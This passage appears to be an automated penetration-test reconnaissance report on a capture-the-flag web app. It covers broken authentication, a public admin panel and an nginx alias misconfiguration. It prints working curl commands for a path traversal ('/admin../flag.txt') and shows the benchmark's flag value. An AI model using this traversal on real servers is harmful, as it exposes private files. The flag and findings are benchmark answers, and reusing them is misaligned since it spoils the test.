- Admin panel has zero checks

### Critical Authorization Vulnerabilities

**1. Admin Panel Publicly Accessible**
- **Endpoint:** /admin/, /admin/index.php
- **Expected Protection:** Authentication + admin role check
- **Actual Protection:** None
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/admin/index.php`
- **Impact:** Any anonymous user can access administrative interface
- **CVSS:** 9.1 (Critical) - Broken Access Control

**2. No Authentication System**
- **Expected:** Database-backed login with session management
- **Actual:** Non-functional login that always fails
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/login.php` line 29
- **Impact:** Cannot distinguish between users, cannot enforce access controls
- **CVSS:** 9.8 (Critical) - Broken Authentication

**3. No Role System**
- **Expected:** User roles with hierarchical privileges
- **Actual:** No roles, no privileges, no access differentiation
- **Impact:** All users have identical access (unlimited public access)
- **CVSS:** 9.1 (Critical) - Missing Access Control

## 8. Authorization Vulnerability Candidates

This section identifies specific endpoints and patterns that are prime candidates for authorization testing, organized by vulnerability type.

### 8.1 Horizontal Privilege Escalation Candidates

**Finding:** NO horizontal privilege escalation attack surface exists.

**Reason:** The application has no object identifiers, no multi-user functionality, and no database storage.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|---------------------|-----------|-------------|
| N/A | No endpoints accept object IDs | N/A | N/A | No IDOR vulnerabilities possible |

**Explanation:**
- No endpoints like `/api/users/{user_id}` exist
- No database to store user-owned objects
- No file storage with user-specific files
- Contact form doesn't persist data (no objects to access)
- Login doesn't create sessions (no session objects)

**Missing Attack Surface:**
- User profile access (`/user/{id}`)
- Order/transaction access (`/orders/{order_id}`)
- File access (`/files/{file_id}`)
- Message access (`/messages/{msg_id}`)

### 8.2 Vertical Privilege Escalation Candidates

**High Priority: Admin Panel Access Without Authentication**

| Target Role | Endpoint Pattern | Functionality | Risk Level | Testing Details |
|-------------|------------------|---------------|------------|-----------------|
| admin | /admin/ | Administrative interface | **CRITICAL** | **Directly accessible without any authentication.** File: `/src/app/admin/index.php`. Expected: Session check + admin role validation. Actual: Pure HTML with zero protection. Test: `curl http://target/admin/` succeeds for anonymous users. |
| admin | /admin/index.php | Administrative interface | **CRITICAL** | Same as /admin/ - publicly accessible. |
| admin | /admin | Nginx path misconfiguration | **CRITICAL** | **Enables path traversal** to parent directory. Nginx config line 16-19. Test: `curl http://target/admin../flag.txt` retrieves flag. |

**No Other Vertical Escalation Targets:**
- No `/api/admin/*` endpoints exist
- No system configuration endpoints
- No user management endpoints
- No reporting/analytics endpoints
- No backup/restore endpoints
- Application has only 6 PHP files, all public

**Missing Expected Admin Endpoints (Not Implemented):**
- `/admin/users` - User management
- `/admin/settings` - System configuration
- `/admin/logs` - Audit logs
- `/admin/reports` - Analytics
- `/admin/backup` - Data backup

**Exploitation Path:**
```bash
# Direct admin panel access (no authentication required):
curl http://localhost:40989/admin/
# Returns: Administrative Zone page

# Path traversal to flag:
curl http://localhost:40989/admin../flag.txt
# Returns: flag{9c29301f-3fea-47b5-924d-413607e3db56}
```

### 8.3 Context-Based Authorization Candidates

**Finding:** NO context-based authorization vulnerabilities exist.

**Reason:** The application has no multi-step workflows, no stateful processes, and no session management.

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|----------|----------|---------------------|------------------|
| N/A | No multi-step workflows exist | N/A | No workflow bypass opportunities |

**Missing Workflows (Not Implemented):**
- **Checkout Process:** No e-commerce functionality
- **Onboarding/Setup:** No user registration or onboarding
- **Password Reset:** No password recovery workflow
- **Multi-Step Forms:** No wizard-style forms
- **Approval Workflows:** No admin approval processes

**Why No Context-Based Vulnerabilities:**
- No session state tracking
- Forms don't store data across requests
- Login doesn't progress through authentication stages
- Contact form is single-step (no validation workflow)
- Admin panel has no prerequisites (publicly accessible)

### 8.4 Summary of Authorization Testing Targets

**Total Authorization Vulnerabilities:** 1 critical category

**Critical Targets:**
1. **Admin Panel Direct Access** - /admin/, /admin/index.php
   - No authentication required
   - No authorization checks
   - Publicly accessible to anonymous users

2. **Nginx Path Traversal** - /admin (without trailing slash)
   - Exposes parent directory
   - Directory listing enabled
   - Flag file accessible via /admin../flag.txt

**No Authorization Testing Needed For:**
- Horizontal privilege escalation (no objects with IDs)
- Context-based authorization (no stateful workflows)
- Role switching (no role system exists)
- Permission boundaries (no permission model)

**Primary Vulnerability Class:**
- **Broken Access Control (OWASP A01:2021)**
- **Broken Authentication (OWASP A07:2021)**
- **Security Misconfiguration (OWASP A05:2021)**

**Testing Priority:**
1. Access /admin/ without authentication (verify public access)
2. Exploit /admin../flag.txt path traversal
3. Attempt to enumerate directory structure via /admin
4. Submit forms without CSRF tokens (verify CSRF vulnerability)
5. Intercept login credentials over HTTP (verify cleartext transmission)

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** This section analyzes only network-accessible code paths that can be triggered via HTTP requests to http://localhost:40989. Local-only scripts, build tools, CLI applications, and development utilities are excluded.

### CRITICAL FINDING: NO INJECTION SOURCES DETECTED

After comprehensive analysis of all network-accessible PHP files, **zero command injection or SQL injection sources exist** in the XBEN-097-24 application.

### 9.1 Command Injection Analysis

**Dangerous Functions Searched:** All command execution functions across all PHP files

**Searched Functions:**
- `exec()`
- `system()`
- `shell_exec()`
- `passthru()`
- `popen()`
- `proc_open()`
- Backtick operator (`` `command` ``)
- `pcntl_exec()`

**Result:** **ZERO INSTANCES FOUND**

**Files Analyzed:**
1. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/index.php` - No command execution
2. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/home.php` - No command execution
3. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/about.php` - No command execution
4. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/contact.php` - No command execution
5. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/login.php` - No command execution
6. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/admin/index.php` - No command execution

**Conclusion:** The application performs **no shell command execution** from any network-accessible code path.

### 9.2 SQL Injection Analysis

**Dangerous Functions Searched:** All database query functions across all PHP files

**Searched Functions:**
- `mysqli_query()`
- `mysql_query()` (deprecated)
- `mysqli::query()`
- `$pdo->query()`
- `$pdo->exec()`
- `mysqli_connect()`
- `new mysqli()`
- `new PDO()`
- Raw SQL patterns (SELECT, INSERT, UPDATE, DELETE)

**Result:** **ZERO INSTANCES FOUND**

**Database Extensions Installed (But Unused):**
- mysqli
- pdo_mysql
- mysqlnd

**Evidence from Dockerfile:**
```dockerfile
# Line 3: Extensions installed but never used
RUN docker-php-ext-install mysqli pdo_mysql
```

**No Database Connections:**
- No `mysqli_connect()` calls
- No PDO instantiation
- No database configuration
- No connection strings
- No database credentials

**No SQL Queries:**
- No SELECT statements
- No INSERT statements
- No UPDATE statements
- No DELETE statements
- No prepared statements
- No raw SQL strings

**Conclusion:** Despite database extensions being installed, the application **performs no database operations** from any network-accessible endpoint.

### 9.3 User Input Flow Analysis

While the application accepts user input, it never flows into dangerous sinks:

**Input Sources Analyzed:**

**1. Login Form (login.php)**
```php
// Lines 26-27: Input accepted but not used for queries or commands
$username = htmlspecialchars($_POST['username']);
$password = htmlspecialchars($_POST['password']);

// Line 29: Always fails, no database validation
$showError = true;
```
- **Input:** username, password
- **Sanitization:** htmlspecialchars()
- **Dangerous Sink:** None (input discarded)
- **Attack Surface:** Zero injection risk

**2. Contact Form (contact.php)**
```php
// Lines 25-27: Input accepted but not persisted
$name = htmlspecialchars($_POST['name']);
$email = htmlspecialchars($_POST['email']);
$message = htmlspecialchars($_POST['message']);

// Line 29: Generic success message, input never used
echo "<p>Thanks for contacting us, we will be in touch with you shortly.</p>";
```
- **Input:** name, email, message
- **Sanitization:** htmlspecialchars()
- **Dangerous Sink:** None (input discarded)
- **Attack Surface:** Zero injection risk

### 9.4 Other Injection Vectors Analyzed

**File Inclusion - NOT FOUND**
- No `include()` with user input
- No `require()` with user input
- No `include_once()` or `require_once()` with dynamic paths
- **Result:** No Local File Inclusion (LFI) or Remote File Inclusion (RFI) vulnerabilities

**Code Execution - NOT FOUND**
- No `eval()` statements
- No `assert()` with user input
- No `create_function()` calls
- No `preg_replace()` with /e modifier
- **Result:** No code injection vulnerabilities

**LDAP Injection - NOT FOUND**
- No `ldap_search()` calls
- No LDAP functionality
- **Result:** No LDAP injection vulnerabilities

**XML Injection - NOT FOUND**
- No `simplexml_load_string()` calls
- No XML parsing
- No XXE attack surface
- **Result:** No XML injection vulnerabilities

**Server-Side Template Injection - NOT FOUND**
- No template engine (Twig, Smarty, Blade)
- No template rendering
- **Result:** No SSTI vulnerabilities

### 9.5 Comprehensive Injection Sources Summary

**Command Injection Sources:** 0
**SQL Injection Sources:** 0
**Code Injection Sources:** 0
**File Inclusion Sources:** 0
**LDAP Injection Sources:** 0
**XML Injection Sources:** 0
**Template Injection Sources:** 0

**Total Injection Vulnerabilities:** 0

### 9.6 Why No Injection Vulnerabilities Exist

**Architectural Reasons:**
1. **No Database Layer:** Application has no persistent storage, eliminating SQL injection
2. **No System Commands:** Application doesn't interact with OS, eliminating command injection
3. **Minimal Functionality:** Application only displays static content and accepts form inputs that are immediately discarded
4. **Input Sanitization:** All user input sanitized with `htmlspecialchars()` before any processing
5. **No Dynamic Code:** No code generation or dynamic execution
6. **No External Integrations:** No APIs, services, or external systems to inject into

**Security Observation:**
While the application has **zero injection vulnerabilities**, it suffers from **critical security failures** in other areas:
- Broken authentication (login always fails)
- Broken access control (admin panel publicly accessible)
- Nginx path traversal (flag file accessible)
- No session management
- No CSRF protection
- Cleartext credential transmission (HTTP only)

**Conclusion:** The application is **NOT vulnerable to injection attacks** but is **completely vulnerable to authentication bypass, authorization bypass, and path traversal attacks**.

## 10. Additional Attack Surface Notes

### Secrets Management Vulnerabilities

**CRITICAL: Flag Stored in Version Control**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/.env`
- **Content:** `FLAG="flag{9c29301f-3fea-47b5-924d-413607e3db56}"`
- **Impact:** Flag exposed in git repository
- **Risk:** Anyone with repository access can retrieve flag without exploiting the application

**Flag Injection During Build:**
- **Dockerfile Lines 13-17:**
  ```dockerfile
  COPY flag.txt /var/www/
  ARG FLAG
  RUN sed -i s/@FLAG@/$FLAG/g /var/www/flag.txt
  ```
- **Runtime Location:** `/var/www/flag.txt` (one directory above web root)
- **Intended Protection:** Outside web root should prevent direct access
- **Actual Protection:** BYPASSED via Nginx path traversal vulnerability

### Infrastructure Security Issues

**1. End-of-Life PHP Version**
- **Version:** PHP 7.4.33
- **EOL Date:** November 28, 2022
- **Impact:** No security patches for known vulnerabilities
- **Risk:** Potential PHP interpreter vulnerabilities

**2. No HTTPS/TLS**
- **Protocol:** HTTP only on port 80
- **Impact:** All credentials transmitted in cleartext
- **Risk:** Network sniffing, man-in-the-middle attacks
- **Missing:** SSL/TLS certificate, HTTPS redirect, HSTS header

**3. Missing Security Headers**
- **No Strict-Transport-Security (HSTS):** No HTTPS enforcement
- **No Content-Security-Policy (CSP):** No XSS mitigation policies
- **No X-Frame-Options:** Vulnerable to clickjacking
- **No X-Content-Type-Options:** No MIME sniffing protection
- **No Referrer-Policy:** Unrestricted referrer leakage
- **No Permissions-Policy:** No feature policy restrictions

**4. Directory Listing Enabled**
- **Location:** `/admin` (nginx.conf line 18: `autoindex on;`)
- **Impact:** Exposes file structure
- **Risk:** Information disclosure, reconnaissance aid

### CSRF Vulnerabilities

**All Forms Vulnerable to CSRF:**

**1. Login Form (login.php)**
- No CSRF token generation
- No token validation in POST handler
- **Attack:** Attacker can submit fake login attempts on behalf of users
- **Impact:** Limited (login always fails anyway)

**2. Contact Form (contact.php)**
- No CSRF token generation
- No token validation in POST handler
- **Attack:** Attacker can submit spam messages on behalf of users
- **Impact:** Form abuse, spam submission

### XSS Analysis

**Finding:** Application is secure against XSS attacks.

**Protection Mechanism:**
- All user input sanitized with `htmlspecialchars()`
- No dynamic JavaScript generation
- No client-side code execution
- User input never reflected in output (generic messages only)

**XSS Attack Surface:** None

### Path Traversal Details

**CRITICAL VULNERABILITY: Nginx Alias Misconfiguration**

**Vulnerable Configuration:**
```nginx
# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/nginx.conf
# Lines 16-19:

location /admin {
    alias /var/www/html/;
    autoindex on;
}
```

**Vulnerability Explanation:**
1. `/admin` location (without trailing slash) aliases to `/var/www/html/`
2. Requesting `/admin../` resolves to `/var/www/html/../` → `/var/www/`
3. This exposes the parent directory containing `flag.txt`

**Exploitation:**
```bash
# Directory listing:
curl http://localhost:40989/admin

# Flag retrieval:
curl http://localhost:40989/admin../flag.txt
# Returns: flag{9c29301f-3fea-47b5-924d-413607e3db56}
```

**Root Cause:** Nginx alias directive without trailing slash allows path normalization to escape intended directory.

**Proper Configuration:**
```nginx
location /admin/ {  # Note trailing slash
    alias /var/www/html/admin/;  # Note trailing slash
    autoindex off;
}
```

### Rate Limiting & DoS Protection

**Finding:** No rate limiting or DoS protection.

**Missing Protections:**
- No request rate limiting
- No brute force protection on login form
- No form submission throttling
- No IP-based blocking
- No CAPTCHA or bot protection
- No input length limits (massive payloads accepted)

**DoS Attack Vectors:**
- Form spam (contact form)
- Login brute force (though always fails)
- Large payload submission (no length limits)

### Logging & Monitoring

**Finding:** No security event logging.

**Missing Logging:**
- No authentication attempt logging
- No admin panel access logging
- No form submission logging
- No error logging
- No audit trail

**Impact:** Security events invisible, no incident detection, no forensics capability.

---

**RECONNAISSANCE COMPLETE**

This reconnaissance deliverable provides a comprehensive map of the XBEN-097-24 application's attack surface. The primary vulnerabilities are:
1. **Nginx path traversal** enabling flag retrieval via `/admin../flag.txt`
2. **Broken authentication** with non-functional login system
3. **Broken access control** with publicly accessible admin panel
4. **No session management** preventing authentication state tracking
5. **HTTP cleartext transmission** exposing credentials to network sniffing

All subsequent vulnerability analysis specialists should focus on these architectural and infrastructure-level vulnerabilities rather than application-layer injection attacks, which do not exist in this codebase.